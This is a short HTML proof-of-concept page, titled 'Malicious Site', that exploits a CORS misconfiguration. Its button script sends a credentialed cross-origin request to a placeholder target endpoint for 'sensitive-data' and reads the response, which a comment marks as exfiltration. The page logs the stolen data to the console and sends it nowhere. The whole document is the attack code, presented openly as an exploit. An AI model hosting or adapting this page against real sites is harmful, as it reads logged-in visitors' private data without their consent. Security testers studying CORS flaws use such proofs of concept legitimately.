<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Malicious Site</title>
</head>
<body>
    <h1>Malicious Site</h1>
    <button id="exploitButton">Exploit CORS</button>
    <script>
        document.getElementById('exploitButton').onclick = function() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://target.com/sensitive-data', true);
            xhr.withCredentials = true;
            xhr.onload = function () {
                if (xhr.status === 200) {
                    console.log(xhr.responseText); // Exfiltrate data
                }
            };
            xhr.send();
        };
    </script>
</body>
